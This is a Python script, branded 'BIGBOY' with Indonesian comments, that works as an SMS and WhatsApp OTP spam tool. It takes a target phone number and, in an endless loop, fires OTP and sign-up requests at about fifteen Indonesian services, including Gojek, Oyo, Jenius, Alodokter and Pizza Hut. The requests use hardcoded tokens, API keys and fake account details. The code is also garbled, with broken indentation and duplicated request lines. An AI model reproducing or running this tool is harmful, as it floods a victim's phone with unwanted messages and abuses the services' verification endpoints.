import sys          # Untuk fungsi pada terminal, seperti autoketik() dan exit()
import subprocess   # Installing python module within code / script (Tanpa requirements.txt)

try: # Import Module
    import requests # Post, Get, & Put URL API
    import time     # Untuk informasi waktu
    import random   # Untuk random user
    import os       # Untuk "clear" terminal
    import urllib3  # HTTP client untuk Python
    import json     # Agar body requests dapat dilihat dengan cara di print
    import bs4      # Untuk variasi output
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'urllib3'])
    subprocess.check_call([sys.executable, "-m", "pip", "install", 'bs4'])
finally:
    import requests # Post, Get, & Put URL API
    import urllib3  # HTTP client untuk Python
    from bs4 import BeautifulSoup as bs
    
from urllib3.exceptions import *
from bs4 import BeautifulSoup as bs
from pip._vendor.requests import post,get # Bisa langsung "from requests import post,get"

def tanya(nomor):
    check_input = 0
    while check_input == 0:            
        a = input(f"""{merah}Apakah Anda ingin mengulangi Spam Tools? y/t 
{putih}Input Anda: {hijau}""")
        if a == "y" or a == "Y":
            check_input = 1
            start(nomor,1)
            break
        elif a == "t" or a == "T":
            check_input = 1
            autoketik(f"{hijau}Berhasil Keluar Dari Tools")
            sys.exit()
            break
        else:
            print ("Masukkan Pilihan Dengan Benar")
            sys.exit

def jam(nomor): # Don't Remove Code !!!!
        autoketik("Program Berjalan!")
        b       =   nomor[1:12] # Contoh: nomor = 89508226367
        c       =   "62" + b    # Contoh: nomor = 6289508226367
        rto     =   0           # Flag ketika memasuki RTO maka akan program akan otomatis menunda proses selama 10 detik
        RTO_flag = 0
        for _ in range(5): # Looping
            try: # requests yang dikomen dapat dibuka komennya sesuai dengan kondisi error (Baca README.md)
                Jumpstart                              =  requests.post("https://api.jumpstart.id/graphql",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','content-type':'application/json'},data=json.dumps({"operationName":"CheckPhoneNoAndGenerateOtpIfNotExist","variables":{"phoneNo":"+62"+b},"query":"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"}))
                Asani                                  =  requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"62"+b,"email":"akuntesnuyul@gmail.com"}))
                Danacita                               =  json.loads(requests.get("https://api.danacita.co.id/users/send_otp/?mobile_phone="+nomor,headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text)
                Kredito                                =  requests.post("https://app-api.kredito.id/client/v1/common/verify-code/send",'{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}'%(b),headers={"LPR-TIMESTAMP":"1603281035821","Accept-Language":"id-ID","LPR-BRAND":"Kredito","LPR-PLATFORM":"android","User-Agent":"okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android","Authorization":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks","LPR-SIGNATURE":"e15dbea8602409df32a2ed5a123dc244","Content-Type":"application/json; charset=UTF-8","Content-Length":"79"}).text
                Maucash                                =  requests.get(f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={b}&channelType=0",headers={"Host":"japi.maucash.id","accept":"application/json, text/plain, */*","x-origin":"google play","x-org-id":"1","x-product-code":"YN-MAUCASH","x-app-version":"2.4.23","x-source-id":"android","accept-encoding":"gzip","user-agent":"okhttp/3.12.1"}).text
                Gojek                                  =  requests.post("https://api.gojekapi.com/v5/customers", data={"email": "nsjwwiwiwisnsnn12@gmail.com", "name": "akuinginterbang12", "phone":c, "signed_up_country": "ID"},headers={"X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9", "X-Platform": "Android", "X-UniqueId": "8606f4e3b85968fd", "X-AppVersion": "3.52.2", "X-AppId": "com.gojek.app", "Accept": "application/json", "Authorization": "Bearer", "X-User-Type": "customer", "Accept-Language": "id-ID", "X-User-Locale": "id_ID", "Host": "api.gojekapi.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/3.12.1"}).text
                Harvestcake                            =  requests.post("https://harvestcakes.com/register",data={"phone":b},headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
                Oyo                                    =  requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=json.dumps({"phone":b,"country_code": "+62","country_iso_code": "ID","nod": "4","send_otp": "true","devise_role": "Consumer_Guest"}),headers={"Host": "identity-gateway.oyorooms.com","consumer_host": "https://www.oyorooms.com","accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","Content-Type": "application/json","accept": "*/*","origin": "https://www.oyorooms.com","referer": "https://www.oyorooms.com/login","Accept-Encoding": "gzip,deflate,br"}).text
                Sayurbox_wa                            =  requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={"Host":"www.sayurbox.com","content-length":"289","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g","content-type":"application/json","accept":"*/*","x-bundle-revision":"6.0","x-sbox-tenant":"sayurbox","x-binary-version":"2.2.1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.sayurbox.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"})).text
                Tokko_wa                               =  requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","content-length":"306","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","x-tokko-api-client":"merchant_web","content-type":"application/json","accept":"*/*","x-tokko-api-client-version":"4.5.1","sec-ch-ua-platform":"Android","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
                Carsome_wa                             =  requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","x-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"A4p3vs1Ixu9wp3wFmCEG9K","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":1})).text
                Jenius                                 =  requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text
                Alodokter                              =  requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+nomor}})).text
                Pizzahut                               =  requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})).text
autoketik(f"{hijau}Sukses Mengirim Spam")
                countdown(120) # Jangan Diubah !!!!
                
            except requests.exceptions.ConnectionError: # Error Handling Ketika Request Time Out di salah satu URL API
                if RTO_flag == 0:
                    print("")
                    autoketik("--Request Time Out--") # Flag ketika memasuki RTO di salah satu URL API
                    print(f"{putih}Proses Automatis dialihkan ke Requests Alternatif{hijau}")
Gojek                                  =  requests.post("https://api.gojekapi.com/v5/customers", data={"email": "nsjwwiwiwisnsnn12@gmail.com", "name": "akuinginterbang12", "phone":c, "signed_up_country": "ID"},headers={"X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9", "X-Platform": "Android", "X-UniqueId": "8606f4e3b85968fd", "X-AppVersion": "3.52.2", "X-AppId": "com.gojek.app", "Accept": "application/json", "Authorization": "Bearer", "X-User-Type": "customer", "Accept-Language": "id-ID", "X-User-Locale": "id_ID", "Host": "api.gojekapi.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/3.12.1"}).text
                Harvestcake                            =  requests.post("https://harvestcakes.com/register",data={"phone":b},headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
                Oyo                                    =  requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=json.dumps({"phone":b,"country_code": "+62","country_iso_code": "ID","nod": "4","send_otp": "true","devise_role": "Consumer_Guest"}),headers={"Host": "identity-gateway.oyorooms.com","consumer_host": "https://www.oyorooms.com","accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","Content-Type": "application/json","accept": "*/*","origin": "https://www.oyorooms.com","referer": "https://www.oyorooms.com/login","Accept-Encoding": "gzip,deflate,br"}).text
Pizzahut                               =  requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})).text
                

countdown(12) # Jangan Diubah !!!!
                RTO_flag = 1
                rto = 1 # Flag tunda
            
            except requests.exceptions.ConnectionError:
                print("")
                autoketik("--Fail to establish a new connection--")
                time.sleep(10) # Tunda 10 detik
                rto = 1

            #https://urllib3.readthedocs.io/en/stable/reference/urllib3.exceptions.html
            except urllib3.exceptions.NewConnectionError: # Error Handling 2 ketika masih terjadi error berlebihan
                print("")
                autoketik("--Fail to establish a new connection--")
                time.sleep(10) # Tunda 100 detik
                rto = 1

            except TimeoutError : # HTTPSConnectionPool() A Connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
                print("")
                autoketik("--A Connection attempt failed because the connected party did not properly respond after a period of time--")
                time.sleep(10) # Tunda 10 detik
                rto = 1

            except urllib3.exceptions.ProtocolError : # HTTPSConnectionPool() A Connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
                print("")
                autoketik("--A Connection attempt failed because the connected party did not properly respond after a period of time--")
                time.sleep(10) # Tunda 10 detik
                rto = 1

            except KeyboardInterrupt: # Error Handling Ketika user menekan tombol CTRL + C atau Interrupt Terminal
                print("")
                tanya(nomor)
        if rto==1:
            time.sleep(20) # Jika sudah error RTO maka tunda dulu proses selama 80 detik
            start(nomor,1)
        else:
            start(nomor,1) # Fungsi start() dengan membawa parameter (nomor target, flag 1 yang berarti bukan perama kali masuk kedalam fungsi start())
        

def start(nomor,x): # Def Untuk Start Tools
    if x == 0: # Flag ketika pertama kali masuk kedalam Fungsi start()
        os.system("cls") # Clear Terminal
        autoketik(f"{merah}Infinite Loop Spam to {putih}{nomor} {merah}is {hijau}Ready!{hijau}") # Flag dimana program berjalan
        jam(nomor)
    else:
        print("")
        autoketik("--reboot wait 20 second--")
        time.sleep(5) # Tunda 10 detik
        os.system("cls") # Clear Terminal
        autoketik(f"{merah}Mengulang Spam ke Nomor : {nomor}.....{hijau}") # Flag dimana program berjalan
        jam(nomor)
        
def main():
    os.system("cls") # Clear Terminal agar CMD berwarna
    autoketik(f"Selamat datang di {merah}BIGBOY")
    print(f"""{kuning}Author      : {hijau}AkuXXX
{kuning}Github      : {merah}github.com/Toletole
{kuning}Instagram   : {biru}instakepo""")
    # Contoh : 089508226367
    print(nomor := input(f"{hijau}Masukkan Nomor Target: {putih}")) # Walrus Operator untuk inputan Nomor Target
    start(nomor,0) # Memulai Tools

try:
    main()
except KeyboardInterrupt:
    autoketik(f"""{merah}Batal
{hijau}--Keluar Dari Tools--""")
    sys.exit()
